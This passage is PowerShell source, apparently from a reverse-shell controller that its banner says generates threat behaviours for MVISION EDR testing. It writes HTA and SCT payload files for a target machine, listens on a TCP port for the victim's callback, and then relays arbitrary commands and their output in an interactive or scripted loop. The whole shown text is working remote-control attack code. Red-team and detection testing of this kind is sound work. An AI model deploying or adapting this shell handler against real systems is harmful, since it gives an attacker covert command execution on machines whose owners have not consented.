    Set-Content -Path "$outputPath\Payload_HTA-$controllerPort.hta" -Value $htaPayload;
    Set-Content -Path "$outputPath\Payload_SCT-$controllerPort.sct" -Value $sctPayload;
    
    return;
};

function CreateTCPConnection
{
    param
    (
        [Parameter(Mandatory = $true)] [bool]$automated,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [string]$controllerPort
    )

    $resultMessage = "Listening for connection on port $controllerPort.";
    $arguments = 
    @{
        automated = $automated
        outputPath = $outputPath
        resultMessage = $resultMessage
    };
    LogResultMessage @arguments;

    $tcpListener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', $controllerPort);
    $tcpListener.Start();
    $tcpClientConnection = $tcpListener.AcceptTcpClient();
    $remoteHostIPAddress = $tcpClientConnection.Client.RemoteEndPoint.Address.IPAddressToString;
    
    $resultMessage = "Connection established with $remoteHostIPAddress.";
    $arguments = 
    @{
        automated = $automated
        outputPath = $outputPath
        resultMessage = $resultMessage
    };
    LogResultMessage @arguments;
    
    $networkStream = $tcpClientConnection.GetStream();

    return $tcpListener, $tcpClientConnection, $networkStream, $remoteHostIPAddress;
};

function DestroyTCPConnection
{
    param
    (
        [Parameter(Mandatory = $true)] [System.Net.Sockets.TcpListener]$tcpListener, 
        [Parameter(Mandatory = $true)] [System.Net.Sockets.TcpClient]$tcpClientConnection, 
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream
    );
    
    $networkStream.Dispose();
    $tcpClientConnection.Close();
    $tcpListener.Stop();

    $resultMessage = "Connection Destroyed.";

    return $resultMessage;
};

function SendRemoteCommand
{
    param
    (
        [Parameter(Mandatory = $true)] [string]$remoteCommand, 
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream
    );

    $buffer = [System.Byte[]]::CreateInstance([System.Byte],1024);

    if (!($remoteCommand.length % $buffer.count))
    { 
        $remoteCommand += " ";
    }

    $remoteCommandASCIIBytes = ([text.encoding]::ASCII).GetBytes($remoteCommand);
    try 
    {
        $networkStream.Write($remoteCommandASCIIBytes, 0, $remoteCommandASCIIBytes.length);
        $networkStream.Flush();
        $continue = $true;
        $resultMessage = "";
    }
    catch 
    {
        $continue = $false;
        $resultMessage = "*** Error: $_";
    }

    return $continue, $resultMessage;
};

Function ReceiveRemoteCommandOutput
{
    param
    (
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream,
        [Parameter(Mandatory = $false)] $timespan = 15
    );

    $buffer = [System.Byte[]]::CreateInstance([System.Byte],1024);

    $timeout = New-Timespan -Minutes $timespan;
    $stopwatch = [diagnostics.stopwatch]::StartNew();

    while (!($networkStream.DataAvailable) -and ($stopwatch.Elapsed -lt $timeout))
    {
        Start-Sleep -Milliseconds 1;
    }

    if ($networkStream.DataAvailable)
    {
        while ($networkStream.DataAvailable)
        {
            try 
            {
                if (!($networkStream.DataAvailable))
                {
                    $stopwatch = [diagnostics.stopwatch]::StartNew();
                                    
                    while ((!($networkStream.DataAvailable)) -and ($stopwatch.Elapsed -lt $timeout))
                    {
                        Start-Sleep -Milliseconds 1;
                    }

                    if (!($networkStream.DataAvailable))
                    {
                        $continue = $false;
                        $resultMessage = "*** Error: No command output available to retrieve.";
                    } 
                }
                else
                {
                    $networkStreamSize = $networkStream.Read($buffer,0,$buffer.Length);
                    $continue = $true;
                    $resultMessage += (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$networkStreamSize);
                    $stopwatch = [diagnostics.stopwatch]::StartNew();
                }
            }
            catch 
            {
                $continue = $false;
                $resultMessage = "*** Error: $_";
            }
        }
    }
    else
    {
        $continue = $true;
        $resultMessage = "*** Error: No command output available to retrieve.";
    }

    return $continue, $resultMessage;
};

Function LogResultMessage
{
    param
    (
        [Parameter(Mandatory = $true)] [bool]$automated,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [string]$resultMessage,
        [Parameter(Mandatory = $false)] [boolean]$logfileOnly = $false
        
    );

    Add-Content -Path "$outputPath\Reconnaissance.log" -Value "$(Get-Date -Format HH:mm:ss) $resultMessage";

    if (!($automated))
    {
        if (!($logfileOnly))
        {
            Write-Host $resultMessage;
        }
    }
}

##################################################
# Main Code
##################################################

$controllerContentPath = "$PSScriptRoot\ControllerContent";

$outputPath = "ExploitResults";
if (!($(Test-Path "$PSScriptRoot\$outputPath")))
{
    New-Item -Path $PSScriptRoot -Name $outputPath -ItemType "directory";
}
$outputPath = "$PSScriptRoot\$outputPath";

$remoteContentPath = "RemoteContent";
if (!($(Test-Path "$PSScriptRoot\$remoteContentPath")))
{
    New-Item -Path $PSScriptRoot -Name $remoteContentPath -ItemType "directory";
}
$remoteContentPath = "$PSScriptRoot\$remoteContentPath";

if ($automated)
{
    [System.Collections.ArrayList]$scriptCommands = [IO.File]::ReadAllLines($automationScript)
    $scriptCommandCount = $scriptCommands.Count;    
}
else
{ 
    Write-Host ("ReverseTCPShell - Used to generate threat behaviors in MVISION EDR.");

    $controllerPort = GetControllerTCPPort;
}

$arguments = 
@{
    controllerPort = $controllerPort
    outputPath = $remoteContentPath
};
GenerateRemoteHostPayload @arguments;

$arguments = 
@{
    automated = $automated
    outputPath = $outputPath
    controllerPort = $controllerPort
};
$tcpListener, $tcpClientConnection, $networkStream, $remoteHostIPAddress = CreateTCPConnection @arguments;

if (!($automated))
{
    $continue, $resultMessage = cmd_HELP;
    Write-Host $resultMessage;
}

$continue = $true
while ($continue)
{
    $userInput = $null;
    $userCommand = $null;
    $userCommandParameters = $null;
    $remoteCommand = $null;
    $resultMessage = $null;

    if ($automated)
    {
        if ($scriptCommandCount -gt 0)
        {
            $userInput = $scriptCommands[0];
            $scriptCommands.RemoveAt(0);
            $scriptCommandCount -= 1;
        }
        else 
        {
            $userInput = "Exit";
        }
    }
    else 
    {
        Write-Host -NoNewline ("Command: ");
        $userInput = Read-Host;
    }
    
    $userCommand = $($userInput.Split()[0]).ToUpper();
    $userCommandParameterCount = $userInput.Split().Count - 1;

    if ($userCommandParameterCount -gt 0)
    {
        $userCommandParameters = $userInput.Split()[1..($userCommandParameterCount - 1)];
    }

    if ($($userCommandFunctionNames).Contains("cmd_" + $userCommand))
    {
        $arguments = 
        @{
            automated = $automated
            outputPath = $outputPath
            resultMessage = $userInput
            logfileOnly = $true
        };
        LogResultMessage @arguments;

        $arguments = 
        @{
            automated = $automated
            networkStream = $networkStream
            remoteHostIPAddress = $remoteHostIPAddress
            controllerContentPath = $controllerContentPath;
            outputPath = $outputPath
            userCommandParameterCount = $userCommandParameterCount
            userCommandParameters = $userCommandParameters
        };
        $continue, $resultMessage = & $("cmd_" + $userCommand) @arguments;
    }
    elseif (!([string]::IsNullOrEmpty($userInput)))
    {
        $arguments = 
        @{
            automated = $automated
            outputPath = $outputPath
            resultMessage = $userInput
            logfileOnly = $true
        };
        LogResultMessage @arguments;

        $arguments = 
        @{
            remoteCommand = $userInput 
            networkStream = $networkStream
        };
        $continue, $resultMessage = SendRemoteCommand @arguments;

        if ($continue)
        {
            $arguments = 
            @{
                networkStream = $networkStream
            };
            $continue, $resultMessage = ReceiveRemoteCommandOutput @arguments;
        }
    }

    $arguments = 
    @{
        automated = $automated
        outputPath = $outputPath
        resultMessage = if ([string]::IsNullOrEmpty($resultMessage)) { " " } else { $resultMessage };
    };
    LogResultMessage @arguments;
}

$arguments = 
@{
    tcpListener = $tcpListener
    tcpClientConnection = $tcpClientConnection
    networkStream = $networkStream
};
$resultMessage = DestroyTCPConnection @arguments;

$arguments = 
@{
    automated = $automated
    outputPath = $outputPath
    resultMessage = $resultMessage
};
LogResultMessage @arguments;

$arguments = 
@{
    automated = $automated
    outputPath = $outputPath
    resultMessage = "Exiting.`n"
};
LogResultMessage @arguments;
